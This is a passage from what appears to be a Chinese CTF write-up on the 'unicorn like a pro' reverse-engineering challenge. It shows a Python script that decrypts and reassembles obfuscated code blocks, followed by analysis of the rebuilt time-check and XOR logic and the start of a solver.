class="hljs-number">0xFFFFF856</span>, <span class="hljs-number">0xD1A79AD7</span>, <span class="hljs-number">0xFFFFF955</span>, <span class="hljs-number">0x14673B75</span>, <span class="hljs-number">0xBB8DB95E</span>, <span class="hljs-number">0xFFFFFEEB</span>, <span class="hljs-number">0x6A7F1E5A</span>, <span class="hljs-number">0xFFFFF3B3</span>, <span class="hljs-number">0x1EF2F3AA</span>, <span class="hljs-number">0xBC1EDA22</span>, <span class="hljs-number">0xFFFFFB90</span>, <span class="hljs-number">0xE247955F</span>, <span class="hljs-number">0xFFFFFCE6</span>, <span class="hljs-number">0xA0351A85</span>, <span class="hljs-number">0xBCD91FE8</span>, <span class="hljs-number">0x0000008C</span>, <span class="hljs-number">0x71A348B9</span>, <span class="hljs-number">0x00000030</span>, <span class="hljs-number">0x821754EF</span>, <span class="hljs-number">0xBD38E305</span>, <span class="hljs-number">0xFFFFFF59</span>, <span class="hljs-number">0xE694333F</span>, <span class="hljs-number">0xFFFFFEF9</span>, <span class="hljs-number">0x436B1A45</span>, <span class="hljs-number">0xBE1AA65A</span>, <span class="hljs-number">0xFFFFF93D</span>, <span class="hljs-number">0x8761A810</span>, <span class="hljs-number">0xFFFFFEEB</span>, <span class="hljs-number">0xB2DB19FA</span>, <span class="hljs-number">0xC052453C</span>, <span class="hljs-number">0x000009B5</span>, <span class="hljs-number">0xB05027D7</span>, <span class="hljs-number">0x000009C5</span>, <span class="hljs-number">0xBCA91679</span>, <span class="hljs-number">0xC4A2D780</span>, <span class="hljs-number">0x000008B9</span>, <span class="hljs-number">0xE42FD068</span>, <span class="hljs-number">0x000007C1</span>, <span class="hljs-number">0x9F8B2B83</span>, <span class="hljs-number">0xC6A236BA</span>, <span class="hljs-number">0xFFFFFDBB</span>, <span class="hljs-number">0x20649A12</span>, <span class="hljs-number">0xFFFFFD09</span>, <span class="hljs-number">0x5F73FD94</span>, <span class="hljs-number">0xC6BB5160</span>, <span class="hljs-number">0xFFFFFE90</span>, <span class="hljs-number">0x0ED42674</span>, <span class="hljs-number">0xFFFFFF4B</span>, <span class="hljs-number">0xA76699CC</span>, <span class="hljs-number">0xCB74E940</span>, <span class="hljs-number">0x000003E3</span>, <span class="hljs-number">0x7DA194FF</span>, <span class="hljs-number">0xFFFFFCDA</span>, <span class="hljs-number">0xB23E5B15</span>, <span class="hljs-number">0xD027B387</span>, <span class="hljs-number">0xFFFFF701</span>, <span class="hljs-number">0x880BCC4F</span>, <span class="hljs-number">0xFFFFF785</span>, <span class="hljs-number">0xFEA3D685</span>, <span class="hljs-number">0xD1127D6B</span>, <span class="hljs-number">0xFFFFFAC0</span>, <span class="hljs-number">0xDF3D499A</span>, <span class="hljs-number">0x00000362</span>, <span class="hljs-number">0x84B7777D</span>, <span class="hljs-number">0xD6F5F913</span>, <span class="hljs-number">0xFFFFFCCD</span>, <span class="hljs-number">0xA5D89DB8</span>, <span class="hljs-number">0xFFFFFCAB</span>, <span class="hljs-number">0xF69BAE29</span>, <span class="hljs-number">0xDD04F828</span>, <span class="hljs-number">0xFFFFF705</span>, <span class="hljs-number">0xE18F3BA0</span>, <span class="hljs-number">0xFFFFF64D</span>, <span class="hljs-number">0xEBC799B0</span>, <span class="hljs-number">0xDDF22CB8</span>, <span class="hljs-number">0x0000075D</span>, <span class="hljs-number">0x47F7B857</span>, <span class="hljs-number">0x000001B3</span>, <span class="hljs-number">0x5C1CDEA9</span>, <span class="hljs-number">0xDF34D0A8</span>, <span class="hljs-number">0x0000014D</span>, <span class="hljs-number">0xBFE2CAD5</span>, <span class="hljs-number">0x00000201</span>, <span class="hljs-number">0x1F0C8A89</span>, <span class="hljs-number">0xE146EA40</span>, <span class="hljs-number">0x0000046D</span>, <span class="hljs-number">0x189EB8F9</span>, <span class="hljs-number">0xFFFFF6FB</span>, <span class="hljs-number">0x4CA1090D</span>, <span class="hljs-number">0xE231C560</span>, <span class="hljs-number">0x00000710</span>, <span class="hljs-number">0x2E586529</span>, <span class="hljs-number">0xFFFFFF17</span>, <span class="hljs-number">0x0E9AA776</span>, <span class="hljs-number">0xE2FC6838</span>, <span class="hljs-number">0x00000733</span>, <span class="hljs-number">0xB73DDD7A</span>, <span class="hljs-number">0x00000753</span>, <span class="hljs-number">0x14A1BDE4</span>, <span class="hljs-number">0xE44AE35D</span>, <span class="hljs-number">0x000002C8</span>, <span class="hljs-number">0x46B1F3D1</span>, <span class="hljs-number">0xFFFFFA2D</span>, <span class="hljs-number">0xD2295816</span>, <span class="hljs-number">0xE5AF4AB1</span>, <span class="hljs-number">0x00000DB0</span>, <span class="hljs-number">0x0AFF4FF9</span>, <span class="hljs-number">0x00000D91</span>, <span class="hljs-number">0xB17A4340</span>, <span class="hljs-number">0xE7E3CF21</span>, <span class="hljs-number">0x00000656</span>, <span class="hljs-number">0x9FC50924</span>, <span class="hljs-number">0x00000658</span>, <span class="hljs-number">0x31615022</span>, <span class="hljs-number">0xE8815965</span>, <span class="hljs-number">0x00000BCB</span>, <span class="hljs-number">0x6F51A655</span>, <span class="hljs-number">0x00000C0A</span>, <span class="hljs-number">0x72F5680C</span>, <span class="hljs-number">0xEBDF0F14</span>, <span class="hljs-number">0xFFFFF2B1</span>, <span class="hljs-number">0xD36EC5D4</span>, <span class="hljs-number">0xFFFFF239</span>, <span class="hljs-number">0x3B711343</span>, <span class="hljs-number">0xEC12E59B</span>, <span class="hljs-number">0x00000270</span>, <span class="hljs-number">0x3A38D2E8</span>, <span class="hljs-number">0x0000023D</span>, <span class="hljs-number">0x68D07674</span>, <span class="hljs-number">0xF4013920</span>, <span class="hljs-number">0x00000703</span>, <span class="hljs-number">0xD83CCFAA</span>, <span class="hljs-number">0x000007BA</span>, <span class="hljs-number">0x46891EEB</span>, <span class="hljs-number">0xF6847EC1</span>, <span class="hljs-number">0xFFFFFE62</span>, <span class="hljs-number">0x6D4BAAFC</span>, <span class="hljs-number">0xFFFFFD92</span>, <span class="hljs-number">0x5E6F5A94</span>]<br>block_key_table = [<span class="hljs-number">0x02F73020</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x09D3473A</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x0EF87B55</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x147CB028</span>, <span class="hljs-number">0x00000023</span>, <span class="hljs-number">0x15F833AA</span>, <span class="hljs-number">0x00000030</span>, <span class="hljs-number">0x17086780</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x1733A9D4</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x17D61EE8</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x1D52F19E</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x1F732DE0</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x1FBECFAD</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0x245BD7C8</span>, <span class="hljs-number">0x00000055</span>, <span class="hljs-number">0x25E7ABEE</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x2882C190</span>, <span class="hljs-number">0x000000A2</span>, <span class="hljs-number">0x2A2084A0</span>, <span class="hljs-number">0x00000075</span>, <span class="hljs-number">0x326AA6AE</span>, <span class="hljs-number">0x00000036</span>, <span class="hljs-number">0x33074A36</span>, <span class="hljs-number">0x00000024</span>, <span class="hljs-number">0x3440BD69</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x362A1FC3</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x3C0450D0</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x3CB575FD</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x41B3B26E</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0x46005120</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x465A72CF</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x492145A0</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x49AA4CE0</span>, <span class="hljs-number">0x0000002D</span>, <span class="hljs-number">0x4BD63647</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0x4BF84A87</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x4D102445</span>, <span class="hljs-number">0x00000033</span>, <span class="hljs-number">0x4D4D3C55</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0x53723232</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x5809B5CB</span>, <span class="hljs-number">0x000000A2</span>, <span class="hljs-number">0x5B12FFCE</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x5B1F3000</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x5D9FBD20</span>, <span class="hljs-number">0x00000027</span>, <span class="hljs-number">0x6219EED9</span>, <span class="hljs-number">0x0000008A</span>, <span class="hljs-number">0x65D82D17</span>, <span class="hljs-number">0x0000004C</span>, <span class="hljs-number">0x67F5671A</span>, <span class="hljs-number">0x00000063</span>, <span class="hljs-number">0x6CE2CBC1</span>, <span class="hljs-number">0x00000033</span>, <span class="hljs-number">0x718A739C</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x71A62DD7</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x7693A1F6</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x7A473FB0</span>, <span class="hljs-number">0x00000047</span>, <span class="hljs-number">0x7AEFEDDC</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x7AF2CF90</span>, <span class="hljs-number">0x0000004F</span>, <span class="hljs-number">0x7BE0B8B0</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0x80EB3E88</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x8213506A</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x82468114</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x86B872A2</span>, <span class="hljs-number">0x0000001C</span>, <span class="hljs-number">0x87FBD296</span>, <span class="hljs-number">0x00000019</span>, <span class="hljs-number">0x88719339</span>, <span class="hljs-number">0x00000016</span>, <span class="hljs-number">0x89E2630A</span>, <span class="hljs-number">0x00000024</span>, <span class="hljs-number">0x8CB6536E</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0x92316E00</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x9415A51E</span>, <span class="hljs-number">0x0000004F</span>, <span class="hljs-number">0x94D658E0</span>, <span class="hljs-number">0x0000002B</span>, <span class="hljs-number">0x97E8DFCD</span>, <span class="hljs-number">0x00000036</span>, <span class="hljs-number">0x992E3874</span>, <span class="hljs-number">0x0000002A</span>, <span class="hljs-number">0x9B06958D</span>, <span class="hljs-number">0x00000030</span>, <span class="hljs-number">0x9B36B480</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0xA03CEFAD</span>, <span class="hljs-number">0x0000005A</span>, <span class="hljs-number">0xA39F47E6</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0xA946DEC4</span>, <span class="hljs-number">0x000000B4</span>, <span class="hljs-number">0xAE6173DC</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0xB044A68D</span>, <span class="hljs-number">0x0000008C</span>, <span class="hljs-number">0xB29E36A8</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0xB82781F4</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0xC14DFAF8</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xC3F42E20</span>, <span class="hljs-number">0x0000001E</span>, <span class="hljs-number">0xC5E0065E</span>, <span class="hljs-number">0x00000067</span>, <span class="hljs-number">0xCAD68B21</span>, <span class="hljs-number">0x00000039</span>, <span class="hljs-number">0xCBF29AC7</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xCE8729BC</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0xD2A85A94</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0xD34FA4F3</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xD64611B0</span>, <span class="hljs-number">0x00000058</span>, <span class="hljs-number">0xD814FD56</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0xDD386A80</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0xDE82DFAC</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xEC68D16F</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0xEEDE845B</span>, <span class="hljs-number">0x0000003F</span>, <span class="hljs-number">0xF235F260</span>, <span class="hljs-number">0x0000008D</span>, <span class="hljs-number">0xF9AA1F0B</span>, <span class="hljs-number">0x00000087</span>, <span class="hljs-number">0xFC200887</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xFED657A3</span>, <span class="hljs-number">0x0000000C</span>]<br>table_plus_0 = [[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(jmp_table_plus)//<span class="hljs-number">5</span>)]<br>key_len_table_0 = [[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(block_key_table)//<span class="hljs-number">2</span>)]<br><span class="hljs-comment">#jmp_table分组</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(jmp_table_plus), <span class="hljs-number">5</span>):<br>    table_plus_0[i//<span class="hljs-number">5</span>][<span class="hljs-number">0</span>] = jmp_table_plus[i]   <span class="hljs-comment"># key索引</span><br>    table_plus_0[i//<span class="hljs-number">5</span>][<span class="hljs-number">1</span>] = jmp_table_plus[i+<span class="hljs-number">1</span>]   <span class="hljs-comment"># jmp1</span><br>    table_plus_0[i//<span class="hljs-number">5</span>][<span class="hljs-number">2</span>] = jmp_table_plus[i+<span class="hljs-number">2</span>]   <span class="hljs-comment"># key1</span><br>    table_plus_0[i // <span class="hljs-number">5</span>][<span class="hljs-number">3</span>] = jmp_table_plus[i + <span class="hljs-number">3</span>]   <span class="hljs-comment">#jmp2</span><br>    table_plus_0[i // <span class="hljs-number">5</span>][<span class="hljs-number">4</span>] = jmp_table_plus[i + <span class="hljs-number">4</span>]   <span class="hljs-comment">#key2</span><br><span class="hljs-comment">#block_key_table分组</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(block_key_table), <span class="hljs-number">2</span>):<br>    key_len_table_0[i//<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = block_key_table[i]   <span class="hljs-comment"># key索引</span><br>    key_len_table_0[i//<span class="hljs-number">2</span>][<span class="hljs-number">1</span>] = block_key_table[i+<span class="hljs-number">1</span>]   <span class="hljs-comment">#code长度</span><br><span class="hljs-comment"># print(len(table_plus_0))</span><br><span class="hljs-comment"># print(len(key_len_table_0))</span><br>data_0 = <span class="hljs-number">0x3265B1F5</span>   <span class="hljs-comment">#初始key</span><br>ip = <span class="hljs-number">0x1000</span>    <span class="hljs-comment">#代码起始地址</span><br>end = <span class="hljs-number">0x3f0f</span>   <span class="hljs-comment">#代码块结束标志</span><br><br><span class="hljs-comment">#计算key</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">calc_key</span>(<span class="hljs-params">size_1, ip</span>):</span><br>    <span class="hljs-keyword">return</span> (ip ^ size_1 ^ (ip * size_1) ^ (ip + size_1)) &amp; <span class="hljs-number">0xffffffff</span><br><span class="hljs-comment">#解密代码块</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>(<span class="hljs-params">code, <span class="hljs-built_in">len</span>, key</span>):</span><br>    code0 = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>):<br>        code0.append(code[i] ^ pack(key)[i%<span class="hljs-number">4</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytearray</span>(code0)<br><span class="hljs-comment">#反汇编代码</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">disasm</span>(<span class="hljs-params">data, baseaddr</span>):</span><br>    md = Cs(CS_ARCH_X86, CS_MODE_64)<br>    ins = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> md.disasm(data, baseaddr):<br>        asm_code = <span class="hljs-string">&quot;%s\t%s&quot;</span> % (i.mnemonic, i.op_str)<br>        ins += asm_code + <span class="hljs-string">&quot;\n&quot;</span><br>    <span class="hljs-keyword">return</span> ins<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;uc_code.dump&quot;</span>, <span class="hljs-string">&quot;rb+&quot;</span>)<br>uc_code = f.read()<br><br>fw = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code_finally.bin&quot;</span>, <span class="hljs-string">&quot;wb+&quot;</span>)<br><span class="hljs-comment"># realy_code 例如 &#123;&#x27;0x1000&#x27;: (code, &#x27;_0x104f&#x27;, &#x27;_0x1c1a&#x27;, &#x27;none&#x27;)</span><br><span class="hljs-comment">#key字段代表代码块开始地址，value是一个元组，第一个存储此代码块的代码，第二个存储代码块结束地址，第三个是跳转地址1，第四个是跳转地址2</span><br>realy_code = &#123;&#125;<br>code_len = <span class="hljs-number">0</span><br>work_queue = [(<span class="hljs-number">0x3265B1F5</span>, <span class="hljs-number">0x1000</span>)]   <span class="hljs-comment">#进行bfs遍历的队列</span><br>ip_log = []   <span class="hljs-comment">#记录已经decode的ip地址</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(work_queue) &gt; <span class="hljs-number">0</span>:<br>    <span class="hljs-comment">#print(x)</span><br>    <span class="hljs-comment">#存储地址，防止重复计算</span><br>    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> work_queue:<br>        <span class="hljs-keyword">if</span> d[<span class="hljs-number">1</span>]<span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ip_log:<br>            ip_log.append(d[<span class="hljs-number">1</span>])<br>    T = work_queue[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment">#print(T)</span><br>    work_queue.remove(T)<br>    data_0 = T[<span class="hljs-number">0</span>]<br>    ip = T[<span class="hljs-number">1</span>]<br>    calc_key_start = calc_key(data_0, ip)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key_len_table_0)):<br>        <span class="hljs-keyword">if</span> key_len_table_0[i][<span class="hljs-number">0</span>] == calc_key_start:<br>            len_code = key_len_table_0[i][<span class="hljs-number">1</span>]<br>            code = decode(uc_code[ip-<span class="hljs-number">0x1000</span>:ip-<span class="hljs-number">0x1000</span>+len_code-<span class="hljs-number">2</span>], len_code-<span class="hljs-number">2</span>, data_0)<br>            <span class="hljs-comment">#fw.write(realy_code)</span><br>            end_ip = ip + len_code - <span class="hljs-number">2</span><br>            calc_key_end = calc_key(data_0, end_ip)<br>            <span class="hljs-comment">#print(hex(calc_key_end))</span><br>            <span class="hljs-comment">#最后结束的地方没有代码块结束标志，要单独判断</span><br>            <span class="hljs-keyword">if</span> ip == <span class="hljs-number">0x112d</span>:<br>                code = decode(uc_code[ip - <span class="hljs-number">0x1000</span>:ip - <span class="hljs-number">0x1000</span> + len_code], len_code, data_0)<br>                end_ip = ip + len_code<br>                calc_key_end = calc_key(data_0, end_ip)<br>                realy_code[<span class="hljs-built_in">hex</span>(ip)] = (code, <span class="hljs-string">&quot;_&quot;</span> + <span class="hljs-built_in">hex</span>(end_ip), <span class="hljs-string">&quot;none&quot;</span>, <span class="hljs-string">&quot;none&quot;</span>)<br>            <span class="hljs-comment">#进行conflow1</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(table_plus_0)):<br>                <span class="hljs-keyword">if</span> table_plus_0[j][<span class="hljs-number">0</span>] == calc_key_end:<br>                    <span class="hljs-comment">#print(calc_key_end)</span><br>                    asm_text = disasm(code, ip)<br>                    <span class="hljs-comment">#print(asm_text)</span><br>                    ip0 = end_ip + ctypes.c_int32(table_plus_0[j][<span class="hljs-number">1</span>]).value<br>                    data_00 = (data_0 + table_plus_0[j][<span class="hljs-number">2</span>]) &amp; <span class="hljs-number">0xffffffff</span><br>                    <span class="hljs-comment"># 判断conflow2</span><br>                    <span class="hljs-keyword">if</span> ip0 == <span class="hljs-number">0x10A3</span>:<br>                        data_00 -= <span class="hljs-number">0x2B09B990</span><br>                        ip0 = <span class="hljs-number">0x1EEC</span><br>                    <span class="hljs-keyword">if</span> ip0 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ip_log:<br>                        work_queue.append((data_00, ip0))<br>                    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;qword ptr fs:[&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> asm_text.splitlines()[-<span class="hljs-number">1</span>]:<br>                        ip1 = end_ip + ctypes.c_int32(table_plus_0[j][<span class="hljs-number">3</span>]).value<br>                        data_01 = (data_0 + table_plus_0[j][<span class="hljs-number">4</span>]) &amp; <span class="hljs-number">0xffffffff</span><br>                        <span class="hljs-keyword">if</span> ip1 == <span class="hljs-number">0x10A3</span>:<br>                            data_01 -= <span class="hljs-number">0x2B09B990</span><br>                            ip1 = <span class="hljs-number">0x1EEC</span><br>                        realy_code[<span class="hljs-built_in">hex</span>(ip)] = (code, <span class="hljs-string">&quot;_&quot;</span> + <span class="hljs-built_in">hex</span>(end_ip),<span class="hljs-string">&quot;_&quot;</span> + <span class="hljs-built_in">hex</span>(ip0), <span class="hljs-string">&quot;_&quot;</span>+<span class="hljs-built_in">hex</span>(ip1))<br>                        <span class="hljs-keyword">if</span> ip1 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ip_log:<br>                            work_queue.append((data_01, ip1))<br>                    <span class="hljs-keyword">else</span>:<br>                        realy_code[<span class="hljs-built_in">hex</span>(ip)] = (code, <span class="hljs-string">&quot;_&quot;</span> + <span class="hljs-built_in">hex</span>(end_ip), <span class="hljs-string">&quot;_&quot;</span> + <span class="hljs-built_in">hex</span>(ip0), <span class="hljs-string">&quot;none&quot;</span>)<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-comment">#print(realy_code)</span><br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(realy_code)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(realy_code))<br><span class="hljs-comment">#重建代码，添加跳转指令，</span><br>all_asm = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(realy_code.keys()):<br>    all_asm += <span class="hljs-string">&quot;_&quot;</span> + i + <span class="hljs-string">&quot;:\n&quot;</span>+ disasm(realy_code[i][<span class="hljs-number">0</span>], <span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">if</span> realy_code[i][<span class="hljs-number">3</span>] != <span class="hljs-string">&quot;none&quot;</span>:<br>        all_asm += <span class="hljs-string">&quot;jz &quot;</span> + realy_code[i][<span class="hljs-number">3</span>] + <span class="hljs-string">&quot;\n&quot;</span><br>        all_asm += <span class="hljs-string">&quot;jmp &quot;</span> + realy_code[i][<span class="hljs-number">2</span>] + <span class="hljs-string">&quot;\n&quot;</span><br>    <span class="hljs-keyword">elif</span> realy_code[i][<span class="hljs-number">2</span>] == <span class="hljs-string">&quot;none&quot;</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        all_asm += <span class="hljs-string">&quot;jmp &quot;</span> + realy_code[i][<span class="hljs-number">2</span>] + <span class="hljs-string">&quot;\n&quot;</span><br>all_asm = all_asm.replace(<span class="hljs-string">&quot;endbr64&quot;</span>, <span class="hljs-string">&quot;nop\n&quot;</span> * <span class="hljs-number">4</span>)<br><span class="hljs-built_in">print</span>(all_asm)<br><span class="hljs-comment">#重编译，写入bin文件</span><br>code_bin = asm(all_asm)<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(code_bin)<br></code></pre></td></tr></table></figure><h2 id="分析重建后的代码"><a href="#分析重建后的代码" class="headerlink" title="分析重建后的代码"></a>分析重建后的代码</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos">由于读取<span class="hljs-built_in">fs</span>段会触发回调函数，所以ida伪代码会有一些错误，在读取<span class="hljs-built_in">fs</span>段的这些地方要结合汇编分析。<br>首先调用了syscall函数，回调函数调用<span class="hljs-built_in">time</span>(<span class="hljs-number">0</span>),<span class="hljs-keyword">for</span>循环是用来验证<span class="hljs-built_in">time</span>的值，我们将它当作是check_time函数，可以看到<span class="hljs-built_in">time</span>经过计算得到v75，v75与数据进行比较正确之后，才会进入flag计算阶段。<br></code></pre></td></tr></table></figure><p><img src="/2021/07/25/unicorn%E5%85%A5%E9%97%A8%E5%8F%8A%E5%BC%BA%E7%BD%91%E6%9D%AFunicorn-like-a-pro%E5%A4%8D%E7%8E%B0/image-20210806142256710.png" alt="image-20210806142256710"></p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">下方这段代码，与check_time函数一样，只是<span class="hljs-built_in">fs</span>段的数据发生了变化，最后将计算出来的数据与我们的输入进行异或。<br></code></pre></td></tr></table></figure><p><img src="/2021/07/25/unicorn%E5%85%A5%E9%97%A8%E5%8F%8A%E5%BC%BA%E7%BD%91%E6%9D%AFunicorn-like-a-pro%E5%A4%8D%E7%8E%B0/image-20210806142440624.png" alt="image-20210806142440624"></p><p>之后进行最终的判断阶段：</p><p><img src="/2021/07/25/unicorn%E5%85%A5%E9%97%A8%E5%8F%8A%E5%BC%BA%E7%BD%91%E6%9D%AFunicorn-like-a-pro%E5%A4%8D%E7%8E%B0/image-20210806142936552.png" alt="image-20210806142936552"></p><h2 id="解密思路"><a href="#解密思路" class="headerlink" title="解密思路"></a>解密思路</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python">因为写脚本过程中出现一些问题，所以是脚本也有C语言。<br><br>定义这两个函数：<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change_key</span>(<span class="hljs-params">fs</span>):</span><br>    fs_1 = (<span class="hljs-number">0x756E69636F726E03</span> * fs + <span class="hljs-number">0xBADC0DEC001CAFE</span>) &amp; <span class="hljs-number">0xffffffffffffffff</span><br>    <span class="hljs-keyword">return</span> fs_1<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_time</span>(<span class="hljs-params">v35, fs</span>):</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        data1 = change_key(fs)<br>        <span class="hljs-comment">#print(hex(data1))</span><br>        data2 = change_key(data1)<br>        <span class="hljs-comment">#print(hex(data2))</span><br>        fs = data2<br>        v35 = (((data1 ^ v35) + data2 + <span class="hljs-number">0x21</span> * v35 + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xffffffffffffffff</span>)<br>        <span 